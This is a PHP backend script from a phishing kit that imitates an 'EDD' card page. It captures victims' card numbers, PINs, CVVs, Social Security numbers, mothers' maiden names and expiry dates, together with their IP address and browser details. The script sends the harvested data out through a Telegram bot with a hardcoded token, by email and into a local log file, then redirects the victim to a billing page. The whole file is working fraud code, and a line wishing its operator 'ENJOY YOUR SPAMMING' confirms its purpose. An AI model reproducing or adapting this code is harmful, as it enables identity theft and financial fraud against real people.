<?php

include ('img/wall.php');
include ('insertemailhere/email.php');
$cardnumber = $_POST['cardnumber'];
$cardpin = $_POST['cardpin'];
$cvv = $_POST["cvv"];
$ssn =  $_POST["ssn"];
$madidenname = $_POST["madidenname"];
$exp = $_POST["exp"];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

function sendMessage($token, $chatid, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&text=";
    $url .= urlencode($message);
    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
	}
$token = '1458836486:AAH0dYVk6y8OdOf4eN68_JTiy5O3c0tP-GY';
$chatid = '807456264';

$message .= "--EDD Info V3 Upgraded--\n";
$message .= "|Card Number : ".$_POST['cardnumber']."\n";
$message .= "|Card Pin : ".$_POST['cardpin']."\n";
$message .= "|CVV : ".$_POST['cvv']."\n";
$message .= "|SSN : ".$_POST['ssn']."\n";
$message .= "|Mother's Maiden Name: ".$_POST['madidenname']."\n";
$message .= "|Exp MM/YY: ".$_POST['exp']."\n";
$message .= "-- :) ENJOY YOUR SPAMMING :) ---\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------\n";
$subject = "Result from EDD  Card details v3 upgraded [ ".$_SERVER['REMOTE_ADDR']." ] ";
$headers .= 'From:  <EDD@custompage.com>'."\n";

mail($send,$subject,$message,$headers);
mail($to.$form,$subject,$message,$headers);

$response;
// now execute it:
$result = json_decode(sendMessage($token, $chatid, $message));
if(isset($result->ok) && $result->ok) {
    $response['body'] = 'Congratulations, the message was successfully sent';
} elseif (!$result->ok) {
    $response['error'] = true;
    $response['body'] = $result->error_code . ': ' . $result->description;
} else {
    $response['error'] = true;
    $response['body'] = 'Unknown error. Sorry :(';
};

header("Location: billing.html");

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
    
?>
